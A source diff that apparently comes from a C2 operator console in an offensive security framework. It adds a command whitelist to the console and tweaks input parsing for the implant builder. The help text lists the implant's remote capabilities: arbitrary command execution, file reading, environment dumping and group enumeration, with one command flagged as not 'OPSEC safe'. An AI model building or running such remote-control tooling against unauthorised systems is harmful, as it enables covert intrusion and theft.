@@ -61,13 +61,24 @@ type impInfoStruct struct {
 	GotIt       int32
 }
 
+var cmd_list = []string{"pwd", "gcu", "rc", "rd", "terminal", "groups", "pid", "groupsid", "readfile", "environment",
+	"setenv", "chdir", "change_get", "fing"}
+
+func ifXinY(test string, list []string) bool {
+	for _, check := range list {
+		if check == test {
+			return true
+		}
+	}
+	return false
+}
+
 const cmdHelp = `
 'pwd' gets the current working directory 
 'gcu' gets the current user by querying the security context 
 'rc' runs a command through the terminal, this can be anything 
 'rd' reads the supplied directory  
 'terminal' allows you to run terminal commands - NOT OPSEC SAFE 
-'groups' returns the SID of all local groups the user is in 
 'pid' returns the current process ID 
 'groups' gets all local groups the user belongs to 
 'groupsid' gets the group IDs of the groups the user is in 
@@ -753,7 +764,7 @@ func main() {
 				fmt.Printf("The builder expects, in order, the platform to compile for, the architecture, the output file name, and the listener address and port to use \n")
 				fmt.Printf("windows amd64 example https://test.culbertreport:8000 \n")
 				fmt.Printf("%sBuilder > %s", red, reset)
-				fmt.Scanf("%s %s %s %s", &platform, &arch, &name, &listener)
+				fmt.Scan(&platform, &arch, &name, &listener)
 				if platform == "exit" {
 					break
 				}
@@ -881,6 +892,11 @@ func main() {
 					case cmd == "help":
 						fmt.Print(cmdHelp)
 					default:
+						cmd_check := ifXinY(cmd, cmd_list)
+						if !cmd_check {
+							fmt.Println("Invalid command")
+							break
+						}
 						sig, err := sign(cmd)
 						if err != nil {
 							fmt.Print(err)
